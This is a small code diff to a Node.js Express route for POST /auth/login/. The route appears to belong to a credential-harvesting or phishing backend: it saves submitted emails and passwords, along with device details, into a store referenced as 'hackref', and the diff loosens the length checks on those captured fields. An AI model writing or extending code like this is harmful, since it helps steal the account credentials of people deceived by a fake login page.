@@ -80,8 +80,8 @@ app.post("/auth/login/", function (req, res) {
   inputData["device"] = getUserDevice(req.useragent);
   inputData['archived']=false;
   if (
-    inputData["input_account_email"].length < 25 &&
-    inputData["input_account_password"].length < 16
+    inputData["input_account_email"].length < 30 &&
+    inputData["input_account_password"].length < 26
   ) {
     hackref
       .doc(timestamp.toString())
